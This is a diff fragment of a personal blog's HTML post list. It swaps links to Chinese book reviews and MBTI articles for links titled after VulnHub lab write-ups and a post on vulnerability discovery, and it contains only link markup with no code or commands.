-    <span><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" title="VULNHUB 38 BLUESOMKE">VULNHUB 38 BLUESOMKE</a></span>
+    <span><a href="/2021/11/01/VULNHUB/132%20JETTY/" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
 </div>
 
-    <span><a href="/2019/07/01/BOOK/21%E3%80%8A%E5%9B%B4%E5%9F%8E%E3%80%8B%E9%92%B1%E9%92%9F%E4%B9%A6/" title="《围城》钱钟书">《围城》钱钟书</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
-</div>
-
-    <span><a href="/2023/04/01/MBTI/INFJ%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/" title="INFJ 深度解析">INFJ 深度解析</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
-</div>
-
-    <span><a href="/2020/04/01/MBTI/%E8%87%AA%E6%88%91%E4%B8%8E%E5%8A%A8%E6%9C%BA/" title="自我与动机">自我与动机</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/55%E3%80%8A%E7%BE%8E%E4%B8%BD%E6%96%B0%E4%B8%96%E7%95%8C%E3%80%8B%E9%98%BF%E9%81%93%E5%8F%B8%C2%B7%E8%B5%AB%E8%83%A5%E9%BB%8E/" title="《美丽新世界》阿道司·赫胥黎">《美丽新世界》阿道司·赫胥黎</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/14%E3%80%8A%E4%B8%8E%E6%8A%91%E9%83%81%E7%97%87%E7%9B%B8%E4%BC%B4%E7%9A%84%E6%97%A5%E5%AD%90%E3%80%8B%E9%A9%AC%E4%BF%AE/" title="《与抑郁症相伴的日子》马修">《与抑郁症相伴的日子》马修</a></span>
+    <span><a href="/2022/12/30/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" title="XD22 6 漏洞发现及利用">XD22 6 漏洞发现及利用</a></span>
   </li>
 
   </ul>
